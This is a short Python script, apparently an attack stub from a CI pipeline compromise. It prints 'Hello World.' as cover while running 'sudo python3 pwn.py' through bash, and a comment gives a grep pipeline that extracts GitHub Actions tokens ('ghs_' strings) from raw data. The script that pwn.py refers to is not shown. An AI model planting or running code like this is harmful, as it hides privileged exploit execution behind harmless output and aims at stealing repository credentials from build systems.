import subprocess

# tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{36}' | sort -u
result = subprocess.run(['bash', '-c', """sudo python3 pwn.py"""], capture_output=True, text=True)


print("Hello World.")

print(result.stdout)
print(result.stderr)
